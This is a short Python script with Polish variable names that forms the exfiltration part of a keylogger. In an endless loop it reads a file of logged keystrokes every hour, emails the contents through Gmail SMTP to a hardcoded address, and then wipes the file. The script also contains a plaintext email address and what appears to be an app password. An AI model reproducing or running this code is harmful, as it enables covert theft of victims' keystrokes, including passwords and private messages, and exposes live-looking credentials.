import smtplib, ssl
from time import sleep


while True:
    port = 465
    smtp_serwer = "smtp.gmail.com"
    nadawca = "cashtan2137@gmail.com"
    odbiorca = "cashtan2137@gmail.com"
    haslo = "cdykobjhinmyshwh"

    sleep(3600)
    f = open('key_logger_output.txt')
    f1 = f.readlines()
    f2 = str(f1)
    f3 = f2.replace("\\","  ")
    f4 = f3.replace("\"","  ")
    f5 = f4.replace("\'","  ")
    f6 = f5.replace("]","  ")
    f7 = f6.replace("[","  ")
    f8 = f7.replace(",","  ")


    print(f8)


    wiadomosc = """
    From: <cashtan2137@gmail.com>
    To: <cashtan2137@gmail.com>
    %s
    """ % (f8)

    ssl_pol = ssl.create_default_context()

    with smtplib.SMTP_SSL(smtp_serwer, port, context=ssl_pol) as serwer:
        serwer.login(nadawca, haslo)
        serwer.sendmail(nadawca, odbiorca, wiadomosc)
    sleep(2)
    #usuwanie pliku
    file = open("key_logger_output.txt","r+")
    file.truncate(0)
    file.close()
    print('File Removed!')
